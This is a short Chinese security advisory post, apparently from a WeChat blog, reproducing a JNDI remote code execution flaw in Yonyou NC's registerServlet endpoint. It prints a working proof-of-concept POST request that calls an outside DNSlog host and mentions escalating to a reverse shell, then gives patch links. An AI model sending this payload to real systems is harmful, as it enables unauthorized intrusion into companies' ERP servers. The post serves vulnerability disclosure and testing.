#  【成功复现】用友NC系统JNDI 远程代码执行漏洞(JNDI)   
 暗影安全   2024-06-13 14:23  
  
网安引领时代，弥天点亮未来     
  
  
  
  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
0x01漏洞介绍用友NC是一款企业级的管理软件。它基于互联网应用，具有强大的集团管控功能和灵活的自定义功能，可以满足企业复杂业务流程的需求。同时，NC还提供了全程的客户化服务能力，能够快速响应用户的业务需求。总体来说，用友NC是一款功能全面、使用灵活的企业管理软件，能够广泛应用于各种类型的企业，助力其实现信息化和数字化管理，用友NC registerServlet接口处存在JNDI 远程代码执行漏洞。0x02影响版本用友-UFIDA-NC0x03漏洞复现  
1.访问漏洞环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hD6g5vkJ5c1ejmiboLw64nrRIssEneLVkgjaKGHX56xoYt8TosibUFzicNpTWR8gXNLsaPNibYicJEz2sA/640?wx_fmt=png&from=appmsg "")  
  
2.对漏洞进行复现 POC （POST）漏洞复现POST /portal/registerServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36Content-Type: application/x-www-form-urlencodedContent-Length: 68type=1&dsname=dns://jjjupp.dnslog.cn测试DNSlog命令回显JNDI工具使用参考如下：Oracle WebLogic Server 远程代码执行漏洞(CVE-2023-21839)反弹shell3.nuclei工具测试（漏洞存在）0x04修复建议目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.yonyou.com/https://security.yonyou.com/#/home扫描二维码关注我们  
